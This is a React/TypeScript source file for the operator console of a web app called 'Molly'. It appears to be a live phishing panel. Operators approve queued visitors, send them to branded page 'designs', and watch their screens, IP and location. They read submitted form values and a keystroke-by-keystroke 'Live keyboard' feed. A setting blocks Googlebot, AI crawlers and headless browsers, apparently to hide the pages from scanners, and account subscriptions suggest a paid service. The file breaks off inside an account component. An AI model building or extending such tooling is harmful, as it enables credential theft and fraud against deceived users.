import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState, type MouseEvent as ReactMouseEvent, type ReactNode } from "react";
import { useServerFn } from "@tanstack/react-start";
import { supabase } from "@/integrations/supabase/client";
import {
  listAccounts,
  createAccount,
  adjustSubscription,
  clearSubscription,
  deleteAccount,
  getMyAccount,
} from "@/lib/admin-users.functions";
import type { RealtimeChannel } from "@supabase/supabase-js";
import {
  joinChannel,
  type InputPayload,
  type LiveInputPayload,
  type NavigatePayload,
} from "@/lib/orchestrator";
import {
  loadParticipants,
  markStaleParticipantsOffline,
  purgeStaleUnapproved,
  removeParticipant,
  setParticipantApproval,
  setParticipantAssignment,
  subscribeParticipants,
  type ParticipantRecord,
} from "@/lib/participantStore";
import { StatusDot, type DotState } from "@/components/StatusDot";
import { MollyLogo, type MollyLogoHandle } from "@/components/MollyLogo";
import { LivePreview } from "@/components/LivePreview";
import { FloatingPanel } from "@/components/FloatingPanel";
import { PagesEditor } from "@/components/PagesEditor";

import {
  getDesigns,
  getDesignLogo,
  getPagesFor,
  getRedirectPages,
  subscribeRegistry,
  type DesignRecord,
  type PageRecord,
} from "@/lib/designStore";
import {
  countryFlagEmoji,
  getAppSettings,
  loadAppSettings,
  setBlockBots,
  startAppSettingsSync,
  subscribeAppSettings,
} from "@/lib/appSettings";

function ParticipantGeoLine({ p }: { p: LiveRecord }) {
  const place = [p.city, p.region, p.country].filter(Boolean).join(", ");
  if (!p.ip && !place) return null;
  return (
    <p className="admin-card-geo">
      <span className="admin-card-flag" aria-hidden>{countryFlagEmoji(p.countryCode)}</span>
      {place && <span className="admin-card-place">{place}</span>}
      {p.ip && <span className="admin-card-ip font-mono">{p.ip}</span>}
    </p>
  );
}




export const Route = createFileRoute("/_authenticated/admin")({
  head: () => ({ meta: [{ title: "Molly — Control" }] }),
  component: Admin,
});

type Suite = string;
type Page = string;
type SuiteOpt = { value: string; label: string };
type PageOpt = { value: string; label: string };

function suitesFromDesigns(designs: DesignRecord[]): SuiteOpt[] {
  return designs.map((d) => ({ value: d.id, label: d.label }));
}
function pagesFromPagesFor(pages: PageRecord[]): PageOpt[] {
  return pages.map((p) => ({ value: p.page, label: p.label ?? p.page }));
}

type LiveRecord = ParticipantRecord & { state: DotState };

function pageLabelFromUrl(url: string): string {
  const m = url.match(/^\/([a-z][a-z0-9_-]{0,30})\/([a-z][a-z0-9_-]{0,40})/);
  if (!m) return url === "/" ? "Focus Room" : url;
  const designs = getDesigns();
  const design = designs.find((d) => d.id === m[1]);
  const pages = getPagesFor(m[1]);
  const page = pages.find((p) => p.page === m[2]);
  const suiteLabel = design?.label ?? m[1];
  const pageLabel = page?.label ?? m[2];
  return `${suiteLabel} · ${pageLabel}`;
}

function dotStateFor(p: ParticipantRecord | undefined): DotState {
  if (!p) return "left";
  return p.online ? "on" : "left";
}

function Admin() {
  const [records, setRecords] = useState<Map<string, LiveRecord>>(new Map());
  const [section, setSection] = useState<"queue" | "participants">("queue");
  const [nav, setNav] = useState<"participants" | "pages" | "settings">("participants");
  const [events, setEvents] = useState<InputPayload[]>([]);
  const [liveInputs, setLiveInputs] = useState<Map<string, LiveInputPayload>>(new Map());
  const [previews, setPreviews] = useState<string[]>([]);
  const [designs, setDesigns] = useState<DesignRecord[]>(() => getDesigns());
  const [sidebarOpen, setSidebarOpen] = useState<boolean>(() => {
    if (typeof window === "undefined") return true;
    return localStorage.getItem("admin_sidebar_open") !== "0";
  });
  function toggleSidebar(next?: boolean) {
    setSidebarOpen((prev) => {
      const v = typeof next === "boolean" ? next : !prev;
      if (typeof window !== "undefined") {
        localStorage.setItem("admin_sidebar_open", v ? "1" : "0");
      }
      return v;
    });
  }
  const suites = useMemo(() => suitesFromDesigns(designs), [designs]);
  const channelRef = useRef<RealtimeChannel | null>(null);
  const subscribedRef = useRef(false);
  const mollyRef = useRef<MollyLogoHandle>(null);
  const [, setSettingsTouch] = useState(0); // re-render hook for settings panel only
  const [blockBots, setBlockBotsState] = useState<boolean>(() => getAppSettings().blockBots);
  useEffect(() => {
    const stop = startAppSettingsSync();
    void loadAppSettings();
    const off = subscribeAppSettings((s) => setBlockBotsState(s.blockBots));
    return () => { off(); stop(); };
  }, []);


  async function refreshRecords() {
    const rows = await loadParticipants();
    setRecords(
      new Map(
        rows.map((row) => [
          row.id,
          {
            ...row,
            state: dotStateFor(row),
          },
        ]),
      ),
    );
  }

  useEffect(() => {
    const ch = joinChannel({
      key: `admin_${Math.random().toString(36).slice(2, 8)}`,
      onInput: (p) =>
        setEvents((prev) => {
          // Dedupe: drop if last event matches (pid,field,value) within 300ms.
          const last = prev[0];
          if (
            last &&
            last.participantId === p.participantId &&
            last.field === p.field &&
            last.value === p.value &&
            Math.abs(p.at - last.at) < 300
          ) {
            return prev;
          }
          // Cap at 10 events per participant so the feed never overfloods.
          const next = [p, ...prev];
          const perPid = new Map<string, number>();
          const trimmed: InputPayload[] = [];
          for (const ev of next) {
            const n = perPid.get(ev.participantId) ?? 0;
            if (n >= 10) continue;
            perPid.set(ev.participantId, n + 1);
            trimmed.push(ev);
          }
          return trimmed;
        }),
      onLiveInput: (p) =>
        setLiveInputs((prev) => {
          const next = new Map(prev);
          next.set(p.participantId, p);
          return next;
        }),
    });
    ch.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        subscribedRef.current = true;
        await ch.track({ admin: true });
      }
    });
    channelRef.current = ch;

    void refreshRecords();
    const participantChannel = subscribeParticipants(() => void refreshRecords());

    // Keep accepted participants forever; flip stale online users red and
    // auto-purge unapproved queue entries that have gone quiet.
    const sweeper = window.setInterval(() => {
      void Promise.all([
        markStaleParticipantsOffline().catch(() => undefined),
        purgeStaleUnapproved().catch(() => undefined),
      ]).then(() => refreshRecords()).catch(() => undefined);
    }, 5_000);
    // Safety: full refresh in case a realtime event was dropped.
    const safety = window.setInterval(() => {
      void refreshRecords().catch(() => undefined);
    }, 10_000);
    return () => {
      subscribedRef.current = false;
      window.clearInterval(sweeper);
      window.clearInterval(safety);
      void participantChannel.unsubscribe();
      void ch.unsubscribe();
    };
  }, []);

  // Load designs registry for the redirect selectors + page labels
  useEffect(() => {
    setDesigns(getDesigns());
    const off = subscribeRegistry(() => setDesigns(getDesigns()));
    return off;
  }, []);

  async function broadcast(event: string, payload: unknown, retries = 3) {
    const ch = channelRef.current;
    if (!ch) return;
    for (let i = 0; i < retries; i++) {
      if (subscribedRef.current) {
        try {
          const res = await ch.send({ type: "broadcast", event, payload });
          if (res === "ok") return;
        } catch {
          /* retry */
        }
      }
      await new Promise((r) => setTimeout(r, 200));
    }
  }

  async function sendNavigate(id: string, suite: Suite, page: Page) {
    const url = `/${suite}/${page}`;
    await setParticipantAssignment(id, url);
    const payload: NavigatePayload = { targets: [id], url };
    void broadcast("navigate", payload);
  }


  function kick(id: string) {
    void broadcast("revoke", { id });
    void removeParticipant(id).then(refreshRecords);
    setPreviews((p) => p.filter((x) => x !== id));
  }


  function approve(id: string, suite: Suite, page: Page) {
    const url = `/${suite}/${page}`;
    void setParticipantApproval(id, true, url).then(() => {
      void refreshRecords();
      void broadcast("approve", { id });
      setTimeout(() => void sendNavigate(id, suite, page), 200);
    });
    setRecords((prev) => {
      const r = prev.get(id);
      if (!r) return prev;
      const next = new Map(prev);
      next.set(id, { ...r, approved: true, assignedUrl: url, currentUrl: url });
      return next;
    });
  }

  function revoke(id: string) {
    void broadcast("revoke", { id });
    void setParticipantApproval(id, false, null).then(refreshRecords);
    setRecords((prev) => {
      const r = prev.get(id);
      if (!r) return prev;
      const next = new Map(prev);
      next.set(id, { ...r, approved: false, assignedUrl: null, currentUrl: "/" });
      return next;
    });
    setPreviews((p) => p.filter((x) => x !== id));
  }

  function openPreview(id: string) {
    setPreviews((p) => (p.includes(id) ? p : [...p, id]));
  }
  function closePreview(id: string) {
    setPreviews((p) => p.filter((x) => x !== id));
  }

  const list = useMemo(
    () => Array.from(records.values()).sort((a, b) => a.joinedAt - b.joinedAt),
    [records],
  );
  const queue = list.filter((r) => !r.approved);
  const approved = list.filter((r) => r.approved);

  return (
    <div className="admin-noir min-h-screen">
      <div
        className={`admin-shell ${sidebarOpen ? "is-open" : "is-collapsed"} chat-closed`}
      >
        <aside className="admin-sidebar">
          <div className="admin-sidebar-head">
            <button
              type="button"
              className="admin-brand-btn"
              onMouseEnter={() => mollyRef.current?.play()}
              onClick={() => toggleSidebar()}
              title={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
              aria-label={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
            >
              <span className="admin-avatar">
                <MollyLogo ref={mollyRef} size={28} />
              </span>
              <span className="admin-brand-name">Molly</span>
            </button>
            <div className="admin-sidebar-head-actions">
              <button
                type="button"
                className="admin-icon-btn"
                title={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
                aria-label="Toggle sidebar"
                onClick={() => toggleSidebar()}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="4" width="18" height="16" rx="2" />
                  <path d="M9 4v16" />
                </svg>
              </button>
            </div>
          </div>
          <nav className="admin-nav">
            <button
              type="button"
              className={`admin-nav-item ${nav === "participants" ? "is-active" : ""}`}
              aria-current={nav === "participants" ? "page" : undefined}
              onClick={() => setNav("participants")}
              title="Participants"
            >
              <span className="admin-nav-icon">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="3" y="3" width="7" height="7" rx="1" />
                  <rect x="14" y="3" width="7" height="7" rx="1" />
                  <rect x="3" y="14" width="7" height="7" rx="1" />
                  <rect x="14" y="14" width="7" height="7" rx="1" />
                </svg>
              </span>
              <span className="admin-nav-label">Participants</span>
              <span className="admin-count">{list.length}</span>
            </button>
            <button
              type="button"
              className={`admin-nav-item ${nav === "pages" ? "is-active" : ""}`}
              aria-current={nav === "pages" ? "page" : undefined}
              onClick={() => setNav("pages")}
              title="Pages"
            >
              <span className="admin-nav-icon">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M4 4h10l6 6v10a0 0 0 0 1 0 0H4z" />
                  <path d="M14 4v6h6" />
                </svg>
              </span>
              <span className="admin-nav-label">Pages</span>
            </button>
            <button
              type="button"
              className={`admin-nav-item ${nav === "settings" ? "is-active" : ""}`}
              aria-current={nav === "settings" ? "page" : undefined}
              onClick={() => setNav("settings")}
              title="Settings"
            >
              <span className="admin-nav-icon">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="3" />
                  <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" />
                </svg>
              </span>
              <span className="admin-nav-label">Settings</span>
            </button>

          </nav>
          <AccountChip />
        </aside>



        <main className="admin-main">


          {nav === "participants" ? (
            <>
              <div className="admin-segmented-wrap">
                <div className="admin-segmented" role="tablist">
                  <button
                    role="tab"
                    aria-selected={section === "queue"}
                    className={`admin-seg ${section === "queue" ? "is-active" : ""}`}
                    onClick={() => setSection("queue")}
                  >
                    Queue <span className="admin-seg-count">{queue.length}</span>
                  </button>
                  <button
                    role="tab"
                    aria-selected={section === "participants"}
                    className={`admin-seg ${section === "participants" ? "is-active" : ""}`}
                    onClick={() => setSection("participants")}
                  >
                    Participants <span className="admin-seg-count">{approved.length}</span>
                  </button>
                </div>
              </div>
              <div key={section} className="admin-pane admin-pane-swap">
                {section === "queue" ? (
                  <QueuePane items={queue} onApprove={approve} onKick={kick} suites={suites} />

                ) : (
                  <ParticipantsPane
                    items={approved}
                    onNavigate={sendNavigate}
                    onRevoke={revoke}
                    onKick={kick}
                    onOpenPreview={openPreview}
                    events={events}
                    liveInputs={liveInputs}
                    suites={suites}
                  />
                )}
              </div>
            </>
          ) : nav === "pages" ? (
            <div key="pages" className="admin-pane admin-pane-swap">
              <PagesEditor />
            </div>
          ) : (
            <div key="settings" className="admin-pane admin-pane-swap">
              <SettingsPane
                blockBots={blockBots}
                onToggleBlockBots={(v) => {
                  setBlockBotsState(v);
                  void setBlockBots(v);
                  setSettingsTouch((n) => n + 1);
                }}
              />
            </div>
          )}
        </main>

      </div>



      {previews.map((pid, i) => (

        <LivePreview
          key={pid}
          pid={pid}
          onClose={() => closePreview(pid)}
          initial={{
            pos: { x: 80 + i * 40, y: 80 + i * 40 },
            size: { w: 480, h: 360 },
          }}
        />
      ))}
    </div>
  );
}

function formatRelative(ts: number): string {
  const diff = Math.max(0, Date.now() - ts);
  const s = Math.floor(diff / 1000);
  if (s < 5) return "just now";
  if (s < 60) return `${s}s ago`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}h ago`;
  const d = Math.floor(h / 24);
  return `${d}d ago`;
}

function useTick(ms: number): void {
  const [, setT] = useState(0);
  useEffect(() => {
    const id = window.setInterval(() => setT((t) => t + 1), ms);
    return () => window.clearInterval(id);
  }, [ms]);
}

function QueuePane({
  items,
  onApprove,
  onKick,
  suites,
}: {
  items: LiveRecord[];
  onApprove: (id: string, suite: Suite, page: Page) => void;
  onKick: (id: string) => void;
  suites: SuiteOpt[];
}) {
  if (items.length === 0) {
    return <p className="admin-empty">No one waiting. New participants will appear here for approval.</p>;
  }
  function clearAll() {
    if (items.length === 0) return;
    if (!window.confirm(`Remove all ${items.length} queued ${items.length === 1 ? "entry" : "entries"}?`)) return;
    for (const p of items) onKick(p.id);
  }
  return (
    <div className="admin-queue-wrap">
      <div className="admin-queue-toolbar">
        <button
          className="admin-btn admin-btn-danger"
          onClick={clearAll}
          aria-label="Clear all queued entries"
        >
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginRight: 6, verticalAlign: "-2px" }}>
            <polyline points="3 6 5 6 21 6" />
            <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
            <path d="M10 11v6M14 11v6" />
            <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
          </svg>
          Clear all
        </button>
      </div>
      <div className="admin-grid">
        {items.map((p) => (
          <QueueCard key={p.id} p={p} onApprove={onApprove} onKick={onKick} suites={suites} />
        ))}
      </div>
    </div>
  );
}

function QueueCard({
  p,
  onApprove,
  onKick,
  suites,
}: {
  p: LiveRecord;
  onApprove: (id: string, suite: Suite, page: Page) => void;
  onKick: (id: string) => void;
  suites: SuiteOpt[];
}) {
  const [open, setOpen] = useState(false);
  const [suite, setSuite] = useState<Suite>(() => suites[0]?.value ?? "");
  const [regRev, setRegRev] = useState(0);
  useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
  useTick(30_000);
  const pageOpts: PageOpt[] = useMemo(
    () => (suite ? pagesFromPagesFor(getPagesFor(suite)) : []),
    [suite, regRev],
  );
  const [page, setPage] = useState<Page>(() => pageOpts[0]?.value ?? "");
  // Keep selections valid when suite/page lists change
  useEffect(() => {
    if (!suite && suites[0]) setSuite(suites[0].value);
  }, [suites, suite]);
  useEffect(() => {
    if (!pageOpts.find((o) => o.value === page)) {
      setPage(pageOpts[0]?.value ?? "");
    }
  }, [pageOpts, page]);

  const appearedAbs = new Date(p.joinedAt).toLocaleString();

  return (
    <article className="admin-card">
      <div className="admin-card-head admin-card-head-stack">
        <div className="admin-card-icons">
          <button
            className="admin-icon-btn admin-icon-btn-danger"
            title="Remove from queue"
            onClick={() => onKick(p.id)}
            aria-label="Remove from queue"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="3 6 5 6 21 6" />
              <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
              <path d="M10 11v6M14 11v6" />
              <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
            </svg>
          </button>
        </div>
        <div className="admin-card-id admin-card-id-bottom">
          <StatusDot state={p.state} />
          <span className="font-mono text-sm">{p.id}</span>
          <span className="admin-tag" style={{ marginLeft: 8 }}>Awaiting</span>
        </div>
      </div>
      <p className="admin-card-page">on · {pageLabelFromUrl(p.currentUrl)}</p>
      <p className="admin-card-meta" title={appearedAbs}>
        appeared {formatRelative(p.joinedAt)}
      </p>
      <ParticipantGeoLine p={p} />

      <div className={`admin-popout ${open ? "is-open" : ""}`}>
        <div className="admin-popout-inner">
          <label className="admin-field">
            <span>Design Suite</span>
            <select value={suite} onChange={(e) => setSuite(e.target.value)}>
              {suites.map((s) => (
                <option key={s.value} value={s.value}>
                  {s.label}
                </option>
              ))}
            </select>
          </label>
          <label className="admin-field">
            <span>Starting Page</span>
            <select value={page} onChange={(e) => setPage(e.target.value)}>
              {pageOpts.map((pg) => (
                <option key={pg.value} value={pg.value}>
                  {pg.label}
                </option>
              ))}
            </select>
          </label>
          <button
            className="admin-btn admin-btn-primary w-full"
            onClick={() => suite && page && onApprove(p.id, suite, page)}
            disabled={!suite || !page}
          >
            Confirm & route
          </button>
        </div>
      </div>

      <div className="admin-card-actions">
        <button className="admin-btn admin-btn-primary" onClick={() => setOpen((v) => !v)}>
          {open ? "Cancel" : "Accept"}
        </button>
      </div>
    </article>
  );
}


function CopyChip({
  text,
  className,
  title,
  children,
}: {
  text: string;
  className?: string;
  title?: string;
  children: ReactNode;
}) {
  const [copied, setCopied] = useState(false);
  function copy(e: ReactMouseEvent) {
    e.stopPropagation();
    if (!text) return;
    try {
      void navigator.clipboard.writeText(text);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 900);
    } catch {
      /* ignore */
    }
  }
  return (
    <button
      type="button"
      className={`copy-chip ${className ?? ""}`}
      onClick={copy}
      title={title ?? "Copy"}
    >
      {children}
      {copied && <span className="copy-chip-pill">Copied</span>}
    </button>
  );
}

function ParticipantsPane({
  items,
  onNavigate,
  onRevoke,
  onKick,
  onOpenPreview,
  events,
  liveInputs,
  suites,
}: {
  items: LiveRecord[];
  onNavigate: (id: string, suite: Suite, page: Page) => void;
  onRevoke: (id: string) => void;
  onKick: (id: string) => void;
  onOpenPreview: (id: string) => void;
  events: InputPayload[];
  liveInputs: Map<string, LiveInputPayload>;
  suites: SuiteOpt[];
}) {
  return (
    <div>
      {items.length === 0 ? (
        <p className="admin-empty">No approved participants yet. Approve from the Queue.</p>
      ) : (
        <div className="admin-grid">
          {items.map((p) => (
            <ParticipantCard
              key={p.id}
              p={p}
              onNavigate={onNavigate}
              onRevoke={onRevoke}
              onKick={onKick}
              onOpenPreview={onOpenPreview}
              suites={suites}
              events={events.filter((e) => e.participantId === p.id)}
              liveInput={liveInputs.get(p.id) ?? null}
            />
          ))}
        </div>
      )}
    </div>
  );
}

function ParticipantCard({
  p,
  onNavigate,
  onRevoke,
  onKick,
  onOpenPreview,
  suites,
  events,
  liveInput,
}: {
  p: LiveRecord;
  onNavigate: (id: string, suite: Suite, page: Page) => void;
  onRevoke: (id: string) => void;
  onKick: (id: string) => void;
  onOpenPreview: (id: string) => void;
  suites: SuiteOpt[];
  events: InputPayload[];
  liveInput: LiveInputPayload | null;
}) {
  const [regRev, setRegRev] = useState(0);
  useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
  type PanelKey = "redirect" | "submitted" | "keyboard";
  const [panels, setPanels] = useState<Set<PanelKey>>(() => new Set());
  function togglePanel(k: PanelKey) {
    setPanels((prev) => {
      const next = new Set(prev);
      if (next.has(k)) next.delete(k);
      else next.add(k);
      return next;
    });
  }
  function closePanelKey(k: PanelKey) {
    setPanels((prev) => {
      if (!prev.has(k)) return prev;
      const next = new Set(prev);
      next.delete(k);
      return next;
    });
    if (k === "redirect") setTimeout(() => setPickedSuite(null), 200);
  }
  const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);

  const pageOpts: PageOpt[] = useMemo(
    () => (pickedSuite ? pagesFromPagesFor(getRedirectPages(pickedSuite)) : []),
    [pickedSuite, regRev],
  );

  const submitted = useMemo(() => {
    const map = new Map<string, InputPayload>();
    for (const e of events) {
      if (/_clicked$/.test(e.field) || e.field === "continue_clicked") continue;
      const prev = map.get(e.field);
      if (!prev || prev.at <= e.at) map.set(e.field, e);
    }
    return Array.from(map.values()).sort((a, b) => b.at - a.at);
  }, [events]);

  return (
    <article className="admin-card">
      <div className="admin-card-head admin-card-head-stack">
        <div className="admin-card-icons">
          <button
            className="admin-icon-btn"
            title="Live preview"
            onClick={() => onOpenPreview(p.id)}
            aria-label="Open live preview"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
              <circle cx="12" cy="12" r="3" />
            </svg>
          </button>
          <button
            className="admin-icon-btn"
            title="Redirect"
            onClick={() => togglePanel("redirect")}
            aria-label="Redirect participant"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="13 6 19 12 13 18" />
            </svg>
          </button>
          <button
            className="admin-icon-btn"
            title="View submitted info"
            onClick={() => togglePanel("submitted")}
            aria-label="View submitted info"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10" />
              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
              <line x1="12" y1="17" x2="12.01" y2="17" />
            </svg>
            {submitted.length > 0 && <span className="admin-icon-badge">{submitted.length}</span>}
          </button>
          <button
            className="admin-icon-btn"
            title="Live typing"
            onClick={() => togglePanel("keyboard")}
            aria-label="Live keyboard"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="6" width="20" height="12" rx="2" />
              <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M7 14h10" />
            </svg>
          </button>
          <button
            className="admin-icon-btn admin-icon-btn-danger"
            title="Revoke access"
            onClick={() => onRevoke(p.id)}
            aria-label="Revoke access"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="1 4 1 10 7 10" />
              <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10" />
            </svg>
          </button>
          <button
            className="admin-icon-btn admin-icon-btn-danger"
            title="Remove"
            onClick={() => onKick(p.id)}
            aria-label="Remove participant"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="3 6 5 6 21 6" />
              <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
              <path d="M10 11v6M14 11v6" />
              <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
            </svg>
          </button>
        </div>
        <div className="admin-card-id admin-card-id-bottom">
          <StatusDot state={p.state} />
          <CopyChip text={p.id} title="Copy participant id" className="copy-chip-inline">
            <span className="font-mono text-xs">{p.id}</span>
          </CopyChip>
        </div>
      </div>
      <p className="admin-card-page">on · {pageLabelFromUrl(p.currentUrl)}</p>
      <ParticipantGeoLine p={p} />

      {panels.has("redirect") && (
        <FloatingPanel
          title={
            <span>
              Redirect <span className="font-mono text-[11px] opacity-60">{p.id}</span>
              {pickedSuite && <span className="opacity-60"> · {pickedSuite}</span>}
            </span>
          }
          accentDot="#8aa6ff"
          onClose={() => closePanelKey("redirect")}
          initialSize={{ w: 360, h: 420 }}
          minSize={{ w: 280, h: 260 }}
        >
          {!pickedSuite ? (
            <div className="admin-modal-list">
              {suites.length === 0 && <p className="admin-redirect-empty">No designs yet.</p>}
              {suites.map((s, i) => {
                const logo = getDesignLogo(s.value);
                return (
                  <button
                    key={s.value}
                    className="admin-redirect-item"
                    style={{ animationDelay: `${i * 30}ms` }}
                    onClick={() => setPickedSuite(s.value)}
                  >
                    {logo ? (
                      <img
                        src={logo}
                        alt=""
                        className="admin-redirect-item-logo"
                        style={{ width: 22, height: 22, objectFit: "contain", borderRadius: 4 }}
                      />
                    ) : (
                      <span className="admin-redirect-item-dot">▤</span>
                    )}
                    <span>{s.label}</span>
                    <span className="admin-redirect-item-arrow">›</span>
                  </button>
                );
              })}
            </div>
          ) : (
            <div className="admin-modal-list">
              <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
                ← back to designs
              </button>
              {pageOpts.length === 0 && <p className="admin-redirect-empty">No pages in this design.</p>}
              {pageOpts.map((pg, i) => (
                <button
                  key={pg.value}
                  className="admin-redirect-item"
                  style={{ animationDelay: `${i * 30}ms` }}
                  onClick={() => {
                    onNavigate(p.id, pickedSuite, pg.value);
                    // Reset to step 1 instead of closing — operator can redirect again.
                    setPickedSuite(null);
                  }}
                >
                  <span className="admin-redirect-item-dot">·</span>
                  <span>{pg.label}</span>
                  <span className="admin-redirect-item-arrow">↗</span>
                </button>
              ))}
            </div>
          )}
        </FloatingPanel>
      )}

      {panels.has("submitted") && (
        <FloatingPanel
          title={<span>Submitted · <span className="font-mono text-[11px]">{p.id}</span></span>}
          accentDot="#5dffa3"
          onClose={() => closePanelKey("submitted")}
          initialSize={{ w: 380, h: 420 }}
          minSize={{ w: 280, h: 220 }}
        >
          <div className="admin-modal-list">
            {submitted.length === 0 ? (
              <p className="admin-redirect-empty">Nothing submitted yet.</p>
            ) : (
              submitted.map((e, i) => (
                <div
                  key={e.field}
                  className="admin-submitted-item"
                  style={{ animationDelay: `${i * 40}ms` }}
                >
                  <div className="admin-submitted-field">{e.field}</div>
                  <CopyChip text={e.value} className="admin-submitted-value copy-chip-block" title="Copy value">
                    {e.value || <em style={{ color: "#555" }}>(empty)</em>}
                  </CopyChip>
                  <div className="admin-submitted-meta">
                    {new Date(e.at).toLocaleTimeString()}
                  </div>
                </div>
              ))
            )}
          </div>
        </FloatingPanel>
      )}

      {panels.has("keyboard") && (
        <FloatingPanel
          title={<span>Live keyboard · <span className="font-mono text-[11px]">{p.id}</span></span>}
          accentDot="#ffd25d"
          onClose={() => closePanelKey("redirect")}
          initialSize={{ w: 420, h: 220 }}
          minSize={{ w: 280, h: 160 }}
        >
          <KeyboardPanelBody liveInput={liveInput} />
        </FloatingPanel>
      )}
    </article>
  );
}

function KeyboardPanelBody({ liveInput }: { liveInput: LiveInputPayload | null }) {
  if (!liveInput) {
    return (
      <div className="kb-panel-empty">
        <p>Waiting for the participant to focus a field.</p>
      </div>
    );
  }
  return (
    <div className="kb-panel">
      <div className="kb-panel-meta">
        <span className={`kb-focus-dot ${liveInput.focused ? "is-on" : ""}`} />
        <span className="kb-panel-field">{liveInput.field}</span>
        <span className="kb-panel-type">{liveInput.ftype}</span>
        <span className="kb-panel-time">{new Date(liveInput.at).toLocaleTimeString()}</span>
      </div>
      <CopyChip text={liveInput.value} className="kb-panel-value copy-chip-block" title="Copy current value">
        {liveInput.value ? (
          <span className="kb-panel-text">{liveInput.value}</span>
        ) : (
          <em className="kb-panel-empty-text">(empty)</em>
        )}
        <span className="kb-caret" aria-hidden />
      </CopyChip>
    </div>
  );
}


function SettingsPane({
  blockBots,
  onToggleBlockBots,
}: {
  blockBots: boolean;
  onToggleBlockBots: (v: boolean) => void;
}) {
  return (
    <div className="admin-settings-page">
      <header className="admin-settings-head">
        <h1 className="admin-settings-h1">Settings</h1>
        <p className="admin-settings-lede">Project-wide controls. More coming soon.</p>
      </header>

      <section className="admin-settings-group">
        <h2 className="admin-settings-group-title">Visitors</h2>
        <label className="admin-settings-row">
          <div>
            <div className="admin-settings-title">Block bots & crawlers</div>
            <div className="admin-settings-sub">
              Drop bot, AI crawler, and headless requests (GPTBot, ClaudeBot, Googlebot,
              Puppeteer, Playwright, etc.) before they join.
            </div>
          </div>
          <input
            type="checkbox"
            className="admin-switch"
            checked={blockBots}
            onChange={(e) => onToggleBlockBots(e.target.checked)}
          />
        </label>
      </section>

      <AccountsSection />

    </div>
  );
}

function AccountChip() {
  const navigate = useNavigate();
  const fetchMe = useServerFn(getMyAccount);
  const [me, setMe] = useState<{ username: string | null; isAdmin: boolean; subscription_until: string | null } | null>(null);

  useEffect(() => {
    let alive = true;
    fetchMe()
      .then((r) => {
        if (alive)
          setMe({
            username: r.username,
